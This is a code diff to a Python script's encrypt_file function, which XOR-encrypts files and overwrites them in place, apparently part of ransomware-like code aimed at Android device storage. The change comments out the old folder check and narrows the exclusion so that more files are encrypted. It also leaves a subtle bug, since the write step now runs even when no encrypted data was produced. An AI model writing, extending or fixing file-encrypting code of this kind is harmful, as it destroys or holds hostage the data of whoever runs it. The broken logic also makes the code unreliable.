@@ -47,16 +47,27 @@ def xor_encrypt_decrypt(data, key):
 
 def encrypt_file(file_path):
     try:
-        if "Android" not in file_path:
+        # if "Android" not in file_path:
+        #     with open(file_path, "rb") as file:
+        #         file_data = file.read()
+        #     encrypted_data = xor_encrypt_decrypt(file_data, int.from_bytes(key, byteorder="big"))
+
+        #     with open(file_path, "wb") as file:
+        #         file.write(encrypted_data)
+        #     print(f"File encrypted successfully: {file_path}")
+        # else:
+        #     print(f"Skipped encryption for the 'Android' folder: {file_path}")
+        if file_path =='Android':
+            pass
+        else:
             with open(file_path, "rb") as file:
                 file_data = file.read()
             encrypted_data = xor_encrypt_decrypt(file_data, int.from_bytes(key, byteorder="big"))
 
-            with open(file_path, "wb") as file:
-                file.write(encrypted_data)
-            print(f"File encrypted successfully: {file_path}")
-        else:
-            print(f"Skipped encryption for the 'Android' folder: {file_path}")
+        with open(file_path, "wb") as file:
+            file.write(encrypted_data)
+        print(f"File encrypted successfully: {file_path}")
+            
     except Exception as e:
         print(f"Encryption failed: {file_path}, Error: {str(e)}")
 
